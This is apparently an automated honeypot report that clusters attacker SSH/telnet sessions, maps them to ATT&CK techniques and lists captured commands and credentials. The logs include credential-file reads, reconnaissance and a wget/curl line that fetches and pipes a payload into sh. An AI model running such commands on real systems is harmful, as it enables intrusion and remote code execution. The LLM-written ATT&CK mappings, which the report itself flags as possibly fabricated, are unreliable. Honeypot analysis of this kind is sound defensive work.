# Cowrie Session & TTP Analysis — 2026-08-04

_Window: last 24h. Baseline: 30d preceding the window. Sessions reconstructed and clustered deterministically; narrative by local LLM._

## Cluster Analysis

- **Cluster f51f8c5f99bd** (PBX & Petrochemicals - sessions: 5, unique_ips: 5): This cluster shows attackers attempting to establish a reverse telnet connection using either `wget` or `curl` to download a payload from a URL. The commands involve modifying the shell environment and piping execution output into `telnet`.
    - **ATT&CK T1204.001**: Command and Scripting Interpreter: Unix Shell (commands executed).
        *Rationale:* Direct command execution performed. Confidence is high here due to observed behavior.
    - **ATT&CK T1566.001**: Phishing: Spearphishing Link (download payload from a URL)
        *Rationale:* The use of `wget` and `curl` points to downloading suspicious content.
- **Cluster 7ab552f01de9** (PBX - sessions: 5, unique_ips: 2): This cluster focused on gathering system information via the `uname -s -v -n -r -m` command, indicating an intention to map vulnerable versions of systems and gather intelligence about the environment.
    - **ATT&CK T1082**: System Information Discovery (collecting OS version etc.). 
        *Rationale:* Direct system enumeration by using `uname`. Confidence is high here due to observed behavior.
- **Cluster 6fa4c8ac58e7** (PBX & RMM - sessions: 4, unique_ips: 4): It appears that the attackers were probing for information on systems through a series of commands aimed at understanding the environment and network topology. 
    - **ATT&CK T1059.004**: Command and Scripting Interpreter (Unix Shell)
        *Rationale:* General command execution noted. Confidence is moderate due to multiple commands including enumeration steps.

## What's Notable

- The presence of several novel clusters, indicating that some attacking methodologies might be newly introduced (e.g., the novel `echo xsec` cluster or other payload handling instructions).
- There are several fully‐novel command sequences that have not been seen in the baseline analysis – this potentially indicates a move to more targeted and less common scripts among attackers.
- The usage of sector-exclusive clusters means that the attacks appear more focused on specific sectors (PBX, RMM) than random scanning activity – these are more indicative of targeted campaigns as opposed to broad credential stuffing exercises.
- An increase in use of multiple payload download techniques via commonly known utilities like `wget` or `curl`, pointing toward efforts in establishing reverse shells and command & control channels post-exploitation.

## Recommended Actions

**Detection:** 
  - Crafting YARA rules to detect unusual payload structures used in session data (especially the base64 encoded commands).
  - Setting up Suricata detection for suspicious URL payloads using network-based signatures related to the attacker C2 infrastructures.
  - Developing Sigma rules that flag sequences such as `wget/curl` followed by reverse shell executions or script installations which are not normally executed in authorized administrative contexts.

**IOCs Worth Hunting:**
  - URLs mentioned for pulling down payloads with suspicious source IPs (e.g., associated with command and control traffic).
  - The specific novel commands, such as the repeated "echo xsec" or payload download sequences that differ from commonly seen attacks in the baseline analysis.

**No Action Needed Commodity Noise:** 
  - Standard brute force attempts targeting known vulnerable credentials or systems are typical attack noise patterns and can be filtered out accordingly based on frequency and commonality against the honeypot activity history.
  
This analysis is crucial to understanding evolving attacking methods and ensuring more targeted defensive measures against newer, potentially customized commands that may have just started showing up in the attacker's arsenal against our monitored networks.

> **Validation warning:** ATT&CK ids cited but not in the curated menu, possibly fabricated: `T1204.001`, `T1566.001`.

## Totals
| Metric | Count |
|---|---|
| Sessions with commands | 188 |
| Successful logins | 277 |
| Commands | 1,758 |
| Payload downloads | 65 |
| Clusters | 114 |
| Clusters with novel commands | 105 |
| Fully novel clusters | 4 |
| Sector exclusive clusters | 107 |

## By Sector
| Sector | Interactive sessions | Unique IPs |
|---|---|---|
| VoIP / telephony | 107 | 77 |
| remote management (RMM) | 51 | 21 |
| petrochemical | 29 | 23 |
| medical technology | 1 | 1 |

## Command Clusters
| Cluster | Sessions | IPs | Sectors | Exclusive | Novel | Cmds | Payloads |
|---|---|---|---|---|---|---|---|
| `45245f464066` | 17 | 2 | remote management (RMM) | yes | no | 2 | 0 |
| `b55d713e4cae` | 9 | 3 | VoIP / telephony | yes | **full** | 1 | 0 |
| `906055e56391` | 6 | 5 | VoIP / telephony, petrochemical | no | no | 1 | 0 |
| `f51f8c5f99bd` | 5 | 5 | VoIP / telephony, petrochemical | no | 9% | 11 | 0 |
| `c213a35b3477` | 5 | 4 | VoIP / telephony, petrochemical, remote management (RMM) | no | no | 2 | 0 |
| `7ab552f01de9` | 5 | 2 | VoIP / telephony | yes | no | 1 | 0 |
| `6fa4c8ac58e7` | 4 | 4 | VoIP / telephony, remote management (RMM) | no | no | 1 | 0 |
| `98cbf1e25e64` | 4 | 1 | VoIP / telephony | yes | 11% | 9 | 0 |
| `89233a95a033` | 4 | 1 | remote management (RMM) | yes | 11% | 9 | 0 |
| `da43a2ad017a` | 4 | 1 | VoIP / telephony, remote management (RMM) | no | 11% | 9 | 0 |
| `8fdcf6478824` | 4 | 1 | remote management (RMM) | yes | 11% | 9 | 0 |
| `7a620def14a6` | 3 | 2 | petrochemical | yes | 11% | 9 | 0 |
| `f2b21a224482` | 3 | 1 | VoIP / telephony, petrochemical, remote management (RMM) | no | no | 3 | 0 |
| `9750b2b45721` | 2 | 2 | VoIP / telephony | yes | 11% | 9 | 0 |
| `1db2425da44c` | 2 | 2 | VoIP / telephony | yes | 11% | 9 | 0 |

### Cluster `45245f464066` — 17 session(s), 2 IP(s) — **remote management (RMM) only**
```
&k`g&k|zpkfq)ES[M
g & k | zpkfq
```
Credentials used: `zalee	/za	`

### Cluster `b55d713e4cae` — 9 session(s), 3 IP(s) — **fully novel** — **VoIP / telephony only**
```
echo xsec
```
Credentials used: `root/1020`, `root/123456`, `root/1qaz!QAZ`, `root/1qazXSW@`, `root/Aa123456`, `root/password`

### Cluster `906055e56391` — 6 session(s), 5 IP(s)
```
PING
```
Credentials used: `*1/$4`

### Cluster `f51f8c5f99bd` — 5 session(s), 5 IP(s) — 1 novel command(s)
```
id
cat /etc/passwd
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
enable
system
shell
sh
bash
(wget --no-check-certificate -qO- <URL> || curl -sk <URL> | sh -s telnet; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\
wget --no-check-certificate -qO- <URL>
curl -sk <URL>
```
Credentials used: `admin/admin`, `orangepi/orangepi`, `root/P`, `root/password`

### Cluster `c213a35b3477` — 5 session(s), 4 IP(s)
```
echo SHELL_TEST
/bin/busybox TEST
```
Credentials used: `admin/admin`, `root/123456`, `root/root`, `user/user`

### Cluster `7ab552f01de9` — 5 session(s), 2 IP(s) — **VoIP / telephony only**
```
uname -s -v -n -r -m
```
Credentials used: `rdpuser/123456`, `root/123456`, `user/1234`, `user/user`, `username/password`

### Cluster `6fa4c8ac58e7` — 4 session(s), 4 IP(s)
```
uname -s -m
```
Credentials used: `root/1qaz!QAZ`, `root/h3c.com!`, `root/root123456`

### Cluster `98cbf1e25e64` — 4 session(s), 1 IP(s) — 1 novel command(s) — **VoIP / telephony only**
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /
uname -s -v -n -m 2 > /dev/null
/bin/uname -s -v -n -m 2 > /dev/null
/usr/bin/uname -s -v -n -m 2 > /dev/null
busybox uname -s -v -n -m 2 > /dev/null
( [ -f /proc/version ]
[ -f /proc/version ]
head -1 /proc/version | cut -d -f1
[ -f /etc/os-release ]
```
Credentials used: `admin/admin`, `guest/123123`, `root/12345`, `root/password`
